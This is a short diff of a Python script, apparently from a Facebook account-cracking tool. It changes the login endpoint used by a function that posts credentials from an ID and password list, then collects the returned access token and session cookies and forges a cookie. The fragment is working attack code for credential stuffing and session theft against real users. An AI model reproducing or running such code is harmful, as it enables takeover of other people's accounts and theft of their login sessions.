@@ -945,7 +945,7 @@ def m7(ids,pwv):
             'authorization': 'OAuth null',
             'content-type': 'application/x-www-form-urlencoded',
             'x-fb-friendly-name': 'authenticate'}
-            url = 'https://p.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
+            url = 'https://b-graph.facebook.com/auth/login'
             q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
             if 'access_token' in q:
                 coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{coki}"
